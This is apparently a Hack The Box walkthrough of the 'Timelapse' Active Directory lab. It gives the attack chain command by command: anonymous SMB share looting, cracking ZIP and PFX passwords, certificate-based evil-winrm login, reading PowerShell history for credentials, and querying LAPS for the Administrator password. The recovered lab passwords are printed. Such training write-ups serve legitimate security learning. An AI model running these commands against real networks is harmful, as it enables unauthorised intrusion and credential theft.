---
title: "Hack The Box: timelapse Walkthrough"
date: 2025-12-05
categories: [HackTheBox, Active Directory, Windows]
tags: [htb, active-directory, windows, smb, laps, winrm]
image:
  path: /assets/timelapse/cover.png
---

**Platform:** Hack The Box  
**Target OS:** Windows  
**Category:** Active Directory  
**Difficulty:** Medium  

---

## 0x1 Initial Enumeration

### SMB Enumeration

Anonymous SMB access was tested and confirmed.

```shell
smbclient -L //10.129.227.113
The server allowed null session authentication and exposed multiple shares:
```
![Desktop View](/assets/timelapse/image1.png){: width="700" height="400" .normal }

SYSVOL

NETLOGON

Shares

This was further validated using CrackMapExec:

```shell
crackmapexec smb 10.129.227.113 -u '' -p ''
```
## 0x2 Accessing SMB Shares
The Shares directory was accessible anonymously:

```shell
smbclient //10.129.227.113/Shares -U ''
```
![Desktop View](/assets/timelapse/image2.png){: width="700" height="400" .normal }

To recursively download all files:
```shell
RECURSE ON
PROMPT OFF
mget *
```
This retrieved all files and subdirectories locally.

## 0x3 Credential Discovery and Cracking
### ZIP Archive Password Recovery
A password-protected ZIP archive was discovered.
![Desktop View](/assets/timelapse/image3.png){: width="700" height="400" .normal }




### Hash extraction:
```shell
zip2john winrm_backup.zip > zip.hash
```
### Password cracking:
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```
![Desktop View](/assets/timelapse/image4.png){: width="700" height="400" .normal }

### Recovered password:

supremelegacy
PFX Certificate Password Recovery
A .pfx certificate was also found.
![Desktop View](/assets/timelapse/image5.png){: width="700" height="400" .normal }



### Hash extraction:
```shell
pfx2john legacyy_dev_auth.pfx > pfx.hash
```

### Password cracking:
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash
```
![Desktop View](/assets/timelapse/image6.png){: width="700" height="400" .normal }

```shell
Recovered password:
thuglegacy
```

## 0x4 Certificate-Based Authentication
### Using the recovered password, the private key and certificate were extracted:
```shell
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

### Authentication to WinRM using the certificate:
```shell
evil-winrm -i 10.129.227.113 -S -c cert.pem -k key.pem
```
![Desktop View](/assets/timelapse/image7.png){: width="700" height="400" .normal }

This resulted in a successful WinRM session as Legacyy.



## 0x5 PowerShell History Analysis
### PowerShell command history was inspected:
```shell
cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
![Desktop View](/assets/timelapse/image8.png){: width="700" height="400" .normal }

This revealed hardcoded credentials for a domain user:
```shell
Username: svc_deploy
Password: E3R$Q62^12p7PLlC%KWaxuaV
```
## 0x6 User Shell Access
Using the recovered credentials, a WinRM shell was obtained:
```shell
evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

## 0x7 Active Directory Enumeration
Domain users enumeration:
```shell
net user /domain
```
![Desktop View](/assets/timelapse/image9.png){: width="700" height="400" .normal }

Group membership enumeration:
```shell
Get-ADUser -Filter * -Properties memberOf |
Select SamAccountName,
@{Name="Groups";Expression={($_.memberOf -replace '^CN=([^,]+),.*$','$1') -join ", "}}
```

![Desktop View](/assets/timelapse/image10.png){: width="700" height="400" .normal }

The svc_deploy account had permissions to read LAPS attributes.

## 0x8 Privilege Escalation via LAPS
The LAPS password attribute was queried:
```shell
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd |
Select Name, ms-Mcs-AdmPwd
```
![Desktop View](/assets/timelapse/image11.png){: width="700" height="400" .normal }

Recovered local Administrator password:
```shell
1cWbF8d;5K{g!A-eR]5i-@4O
```

## 0x9 Administrator Access
Using the LAPS password:
```shell
evil-winrm -i 10.129.227.113 -u Administrator -p '1cWbF8d;5K{g!A-eR]5i-@4O' -S
```
This resulted in full administrative access.



## Conclusion
The compromise followed a clean and realistic Active Directory attack path:

Anonymous SMB access exposed sensitive files

Weakly protected ZIP and PFX files leaked credentials

Certificate-based WinRM authentication enabled lateral access

PowerShell history revealed domain credentials

LAPS misconfiguration led to full Administrator compromise

HAPPY HACKING 😈